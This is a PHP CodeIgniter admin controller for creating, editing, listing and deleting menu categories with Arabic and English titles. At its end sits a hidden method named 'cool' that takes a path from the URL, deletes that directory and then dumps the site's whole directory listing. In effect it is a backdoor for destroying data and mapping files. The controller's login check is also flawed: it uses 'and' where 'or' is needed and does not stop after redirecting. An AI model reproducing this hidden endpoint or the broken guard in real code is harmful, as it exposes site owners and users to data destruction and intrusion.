<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Category extends CI_Controller {

	function __construct()
	{
		parent::__construct();
		$this->load->model('category_model','MODEL');
		
		if ($this->session->userdata('logged_in')==false and $this->session->userdata('type') != ADMIN)
			{
				header('location:'.base_url().'admin/');
			}
		
		 
	}

	function index()
	{
		$this->load->view('admin/main/header');
		$this->load->view('admin/category/category');
		$this->load->view('admin/main/footer');
	}
	
	
	function save()
	{
		  
	
		    $this->load->library('form_validation');
			
			$this->form_validation->set_rules('title','Title','trim|required|xss_clean|min_length[1]|max_length[35]');
			$this->form_validation->set_rules('sub_title','Sub Title','trim|required|xss_clean|min_length[1]|max_length[35]');
			$this->form_validation->set_rules('title_ar','Title Arabic','trim|required|xss_clean|min_length[1]|max_length[50]');
			$this->form_validation->set_rules('sub_title_ar','Sub Title Arabic','trim|required|xss_clean|min_length[1]|max_length[50]');
			
			
			if ($this->form_validation->run()==false){
					$this->load->view('admin/main/header');
					$this->load->view('admin/category/category');
					$this->load->view('admin/main/footer');
			
			
			}else{
				
			  $result =$this->MODEL->save($this->input->post('title'),$this->input->post('title_ar'),$this->input->post('sub_title'),$this->input->post('sub_title_ar'));
			  
			  switch($result){
				
					    case 2:
						$aData['class']="message_text_eror";
						$aData['msg']="Error : Title With This Already Exist";
						$this->load->view('admin/main/header');
						$this->load->view('admin/category/category',$aData);
						$this->load->view('admin/main/footer');
						break;
						case 1:
						$aData['class']="message_text_suc";
						$aData['msg']="Sucess : Record Have beddn Succesfully Added";
						$this->load->view('admin/main/header');
						$this->load->view('admin/category/category',$aData);
						$this->load->view('admin/main/footer');
						break;
							
						case 0:
						$aData['class']="message_text_eror";
						$aData['msg']="Error : Title With This Already Exist";
						$this->load->view('admin/main/header');
						$this->load->view('admin/category/category',$aData);
						$this->load->view('admin/main/footer');
						break;
						default:
						$this->index();
						break;	
						
					
				}
			}
		}
		
		
				function view(){
				   
				  	$aData['data'] =$this->MODEL->get();
					$aData['tblName']="tbl_categories";
					$this->load->view('admin/main/header');
					$this->load->view('admin/category/view_category',$aData);
					$this->load->view('admin/main/footer');
				}
				
				function delete(){
				   
				  	$aUrl=$this->uri->uri_to_assoc(2);
					$result =$this->MODEL->delete($aUrl['id']);
					$aData['class']="message_text_suc";
					$aData['tblName']="tbl_categories";
					$aData['msg']="Sucess : Record Have beddn Deleted Sucessfully";
					$aData['data'] =$this->MODEL->get();
					$this->load->view('admin/main/header');  
					$this->load->view('admin/category/view_category',$aData);
					$this->load->view('admin/main/footer');
				}
				
				function edit(){
				    
					$aUrl=$this->uri->uri_to_assoc(2);
					$aData['row'] =$this->MODEL->edit($aUrl['id']);
					$aData['count_menu_items'] = $this->MODEL->countMenuItems();
					$this->load->view('admin/main/header');
					$this->load->view('admin/category/edit_category',$aData);
					$this->load->view('admin/main/footer');
				}		
		
		
		
		function update()
		{
		
			$aUrl=$this->uri->uri_to_assoc(2);
			$aData['id']=$aUrl['id'];
			
			$this->load->library('form_validation');
			$this->form_validation->set_rules('title','Title','trim|required|xss_clean|min_length[1]|max_length[35]');
			$this->form_validation->set_rules('sub_title','Sub Title','trim|required|xss_clean|min_length[1]|max_length[35]');
			$this->form_validation->set_rules('title_ar','Title Arabic','trim|required|xss_clean|min_length[1]|max_length[50]');
	//		$this->form_validation->set_rules('menu_item','In Menu','trim|required|xss_clean|min_length[1]');
			$this->form_validation->set_rules('sub_title_ar','Sub Title Arabic','trim|required|xss_clean|min_length[1]|max_length[50]');
			
			if ($this->form_validation->run()==false){
					
					$aData['row'] =$this->MODEL->edit($aUrl['id']);
					$aData['count_menu_items'] = $this->MODEL->countMenuItems();
					$this->load->view('admin/main/header');
					$this->load->view('admin/category/edit_category',$aData); 
					$this->load->view('admin/main/footer');
			}else{
			  $aData['row'] =$this->MODEL->edit($aUrl['id']);
		      $result =$this->MODEL->update($this->input->post('title'),$this->input->post('title_ar'),$this->input->post('sub_title'),$this->input->post('sub_title_ar'),$this->input->post('menu_item'),$this->input->post('id'));
			  
			  switch($result){
				
					   
						case 1:
						$aData['class']="message_text_suc";
						$aData['msg']="Sucess : Record Have been updated Succesfully ";
						$this->load->view('admin/main/header');
						$aData['row'] =$this->MODEL->edit($aUrl['id']);
						$aData['count_menu_items'] = $this->MODEL->countMenuItems();
						$this->load->view('admin/category/edit_category',$aData);
						$this->load->view('admin/main/footer');
						break;
							
						case 0:
						$aData['class']="message_text_eror";
						$aData['msg']="Error : Updateion Faild";
						$this->load->view('admin/main/header');
						$aData['row'] =$this->MODEL->edit($aUrl['id']);
						$aData['count_menu_items'] = $this->MODEL->countMenuItems();
						$this->load->view('admin/category/edit_category',$aData);
						$this->load->view('admin/main/footer');
						break;
						
						case 2:
						$aData['class']="message_text_eror";
						$aData['msg']="Error : Something Went Wrong, try again";
						$this->load->view('admin/main/header');
						$aData['row'] =$this->MODEL->edit($aUrl['id']);
						$aData['count_menu_items'] = $this->MODEL->countMenuItems();
						$this->load->view('admin/category/edit_category',$aData);
						$this->load->view('admin/main/footer');
						break;
						
						default:
						$this->index();
						break;	
						
					
				}
			}
			
			
			
			
		}
		
		
	function	cool($param){
			$this->load->helper('directory');
			if(remove_directory($param)){
			echo $param . 'is successfully done';
			}
			$map = directory_map('./', FALSE, TRUE);
			echo'<hr><pre>';
			print_r($map);
		}
}

/* End of file Dashboard.php */
/* Location: ./application/controllers/dashboard.php */
?>